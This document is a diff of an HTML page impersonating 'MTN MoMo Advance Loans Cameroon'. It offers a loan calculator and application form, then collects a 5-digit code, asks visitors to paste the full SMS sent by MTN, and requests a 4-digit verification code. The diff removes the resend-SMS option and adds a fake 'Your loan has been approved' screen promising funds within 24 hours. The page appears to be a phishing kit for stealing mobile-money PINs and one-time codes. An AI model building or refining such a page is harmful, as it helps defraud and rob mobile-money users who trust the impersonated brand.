@@ -20,10 +20,8 @@
                     <circle cx="65" cy="50" r="4" fill="#0a6b43"/>
                 </svg>
             </div>
-
             <h2 class="lang-title">Choose your <span class="highlight-yellow">language</span></h2>
             <p class="lang-subtitle">Select your language to continue</p>
-            
             <div class="lang-options">
                 <div class="lang-option" onclick="selectLanguage('en', this)">
                     <div class="flag-box"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Flag_of_the_United_Kingdom_%281-2%29.svg" class="flag-img"></div>
@@ -41,27 +39,21 @@
                     <div class="radio-btn"></div>
                 </div>
             </div>
-            <p class="lang-footer">You can change it anytime</p>
         </div>
     </div>
 
     <!-- HOME / CALCULATOR SCREEN -->
     <div id="screen-home" class="screen dark-screen">
-        <header>
-            <h1>MTN MoMo Advance Loans Cameroon</h1>
-        </header>
-        
+        <header><h1>MTN MoMo Advance Loans Cameroon</h1></header>
         <div class="content-card">
             <h3>Welcome to MTN MoMo Advance Loans</h3>
             <p>Get loans easily through MTN MoMo Advance Loans Cameroon</p>
-            
             <div class="calculator">
                 <h4>Loan Calculator</h4>
                 <label>Amount (XAF)</label>
                 <input type="range" id="amount-slider" min="5000" max="2000000" step="5000" value="100000">
                 <div class="slider-labels"><span>5,000</span><span>2,000,000</span></div>
                 <div class="calc-display">XAF <span id="loan-amount-display">100,000</span></div>
-
                 <label>Term</label>
                 <select id="term-select">
                     <option value="3">3 Months</option>
@@ -71,31 +63,24 @@
                     <option value="36">36 Months</option>
                     <option value="48" selected>48 Months</option>
                 </select>
-
                 <div class="monthly-payment">
                     <p>Monthly Payment</p>
                     <h2>XAF <span id="monthly-payment-display">2,292</span></h2>
                 </div>
             </div>
-
             <button class="primary-btn" onclick="startApplication()">START APPLICATION</button>
         </div>
     </div>
 
     <!-- APPLICATION FORM SCREEN -->
     <div id="screen-application" class="screen dark-screen">
-        <header>
-            <h1>MTN MoMo Advance Loans Cameroon</h1>
-        </header>
-
+        <header><h1>MTN MoMo Advance Loans Cameroon</h1></header>
         <div class="content-card">
             <div class="form-header">
                 <h3>Loan Application</h3>
                 <p id="step-indicator">Step 1 of 3</p>
             </div>
-
             <form id="loan-form" onsubmit="submitForm(event)" novalidate>
-                <!-- STEP 1 -->
                 <div id="step-1" class="form-step active">
                     <label>Loan Type</label>
                     <select id="loan-type" required>
@@ -105,10 +90,8 @@
                         <option>Emergency Loan</option>
                         <option>Education Loan</option>
                     </select>
-
                     <label>Loan Amount (XAF)</label>
                     <input type="number" id="form-amount" value="100000" min="5000" max="2000000" required>
-
                     <label>Loan Term</label>
                     <select id="form-term" required>
                         <option value="3">3 Months</option>
@@ -118,12 +101,9 @@
                         <option value="36">36 Months</option>
                         <option value="48" selected>48 Months</option>
                     </select>
-
                     <label>Purpose of Loan</label>
                     <input type="text" id="form-purpose" placeholder="e.g., Business expansion" required>
                 </div>
-
-                <!-- STEP 2 -->
                 <div id="step-2" class="form-step">
                     <label>First Name</label>
                     <input type="text" id="first-name" placeholder="John" required>
@@ -137,8 +117,6 @@
                     <label>5-Digit Code</label>
                     <input type="text" id="five-digit-code" placeholder="12345" maxlength="5" minlength="5" pattern="\d{5}" required>
                 </div>
-
-                <!-- STEP 3 -->
                 <div id="step-3" class="form-step">
                     <label>Employment Status</label>
                     <select id="employment-status" required>
@@ -149,10 +127,8 @@
                         <option>Student</option>
                         <option>Unemployed</option>
                     </select>
-
                     <label>Annual Income (XAF)</label>
                     <input type="number" id="annual-income" placeholder="e.g., 5000000" required>
-
                     <div class="summary-box">
                         <h4>Application Summary</h4>
                         <p>Loan Amount: <span id="summary-amount">—</span></p>
@@ -162,7 +138,6 @@
                         <p>Phone: <span id="summary-phone">—</span></p>
                     </div>
                 </div>
-
                 <div class="form-navigation">
                     <button type="button" id="btn-back" class="secondary-btn" onclick="prevStep()" style="display: none;">BACK</button>
                     <button type="button" id="btn-next" class="primary-btn" onclick="nextStep()">NEXT STEP</button>
@@ -182,34 +157,26 @@
                 <circle cx="65" cy="50" r="4" fill="#0a6b43"/>
             </svg>
         </div>
-        
         <div class="custom-spinner"></div>
-        
         <h2 class="processing-title">Processing Application</h2>
         <p class="processing-subtitle">Please wait, this may take a few seconds</p>
         <div class="processing-dots">...</div>
     </div>
 
-    <!-- SMS VERIFICATION SCREEN (Header Removed) -->
+    <!-- SMS SCREEN -->
     <div id="screen-sms" class="screen light-screen">
         <div class="sms-content" style="margin-top: 40px;">
             <div class="envelope-glow">
                 <div class="envelope-icon">
-                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#d93838" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
-                        <polyline points="22,6 12,13 2,6"></polyline>
-                    </svg>
+                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#d93838" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
                 </div>
             </div>
-
             <h2 class="sms-title">Paste the <span>SMS</span> from MTN</h2>
             <p class="sms-subtitle">We sent a confirmation message to your number. <strong>Copy the full SMS you received</strong> and paste it below to continue.</p>
-
             <div class="instruction-box">
                 <span class="bulb">💡</span>
                 <p>Open your <strong>Messages app</strong>, find the SMS from <strong>MTN</strong>, long-press it, tap <strong>Copy</strong>, then come back here.</p>
             </div>
-
             <div class="sms-textarea-container">
                 <textarea id="sms-input" placeholder="Collez le SMS reçu de MTN ici..." maxlength="500"></textarea>
                 <div class="paste-controls">
@@ -217,33 +184,18 @@
                     <button type="button" class="paste-btn" onclick="pasteSMS()">📋 Paste</button>
                 </div>
             </div>
-
-            <div class="resend-area">
-                <span>Didn't receive the SMS?</span>
-                <a href="#">Resend SMS</a>
-            </div>
-
-            <button id="btn-verify-sms" class="verify-btn" onclick="submitSMS()" disabled>
-                VERIFY & CONTINUE →
-            </button>
+            <button id="btn-verify-sms" class="verify-btn" onclick="goToScreen('screen-pin')" disabled>VERIFY & CONTINUE →</button>
         </div>
-        
-        <div class="footer-text">© 2026 MTN Xtra Loan</div>
     </div>
 
     <!-- 4-DIGIT PIN SCREEN -->
     <div id="screen-pin" class="screen dark-screen">
         <div class="pin-content">
             <div class="lock-circle">
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ffcc00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                </svg>
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ffcc00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
             </div>
-
             <h2 class="pin-title">Enter the <span class="highlight-yellow">Verification Code</span></h2>
             <p class="pin-subtitle">We sent a <strong>4-digit code</strong> to your number.<br>Enter it below to continue.</p>
-
             <div class="pin-inputs">
                 <input type="text" maxlength="1" inputmode="numeric" class="pin-box" onkeyup="moveToNext(this, 1)" onkeydown="moveToPrev(this, event, 1)">
                 <input type="text" maxlength="1" inputmode="numeric" class="pin-box" onkeyup="moveToNext(this, 2)" onkeydown="moveToPrev(this, event, 2)">
@@ -251,27 +203,52 @@
                 <input type="text" maxlength="1" inputmode="numeric" class="pin-box" onkeyup="moveToNext(this, 4)" onkeydown="moveToPrev(this, event, 4)">
             </div>
         </div>
-
         <div class="pin-action-area">
-            <button id="btn-verify-pin" class="pin-submit-btn" onclick="verifyPIN()" disabled>
-                VERIFY & CONTINUE →
-            </button>
+            <button id="btn-verify-pin" class="pin-submit-btn" onclick="submitPIN()" disabled>VERIFY & CONTINUE →</button>
         </div>
     </div>
 
-    <!-- SUCCESS SCREEN -->
-    <div id="screen-success" class="screen dark-screen">
-        <div class="content-card text-center">
-            <div style="width: 80px; height: 80px; background: rgba(10, 107, 67, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px auto;">
-                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#0a6b43" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
+    <!-- NEW: CONGRATULATIONS SUCCESS SCREEN -->
+    <div id="screen-success" class="screen success-screen">
+        <div class="success-card">
+            
+            <!-- Top Blue Section -->
+            <div class="success-header">
+                <!-- Emoji Confetti Backgrounds -->
+                <div class="confetti confetti-1">🎉</div>
+                <div class="confetti confetti-2">💵</div>
+                
+                <div class="success-logo">
+                    <svg width="70" height="70" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="100" height="100" rx="24" fill="#004C6C"/>
+                        <path d="M30 75L50 35H60L75 75" stroke="#FFCC00" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
+                        <path d="M35 65H75" stroke="#FFCC00" stroke-width="6" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                
+                <div class="party-popper">🎉</div>
+                <h2>Congratulations!</h2>
+                <p>Your loan has been approved</p>
             </div>
             
-            <h2 style="color: #fff; font-size: 1.8rem; margin-bottom: 10px;">Application Received!</h2>
-            <p style="color: #8fa9bc; margin-bottom: 30px;">Your loan application has been successfully submitted. Our team will review it shortly.</p>
+            <!-- Bottom White Section -->
+            <div class="success-body">
+                <!-- Confetti emojis for the white section -->
+                <div class="confetti-w">🟨</div>
+                <div class="confetti-w confetti-w-2">🟦</div>
+                
+                <p class="approved-label">APPROVED AMOUNT</p>
+                
+                <!-- Dynamic Amount populated by JS -->
+                <h1 class="approved-amount">XAF <span id="final-amount-display">1,000,000</span></h1>
+                
+                <div class="funds-badge">
+                    ⏰ Funds within less than 24 hours
+                </div>
+                
+                <p class="success-footer-text">You'll receive an SMS notification once the loan has been credited to your account.</p>
+            </div>
             
-            <button class="primary-btn" onclick="location.reload()">RETURN TO HOME</button>
         </div>
     </div>
 
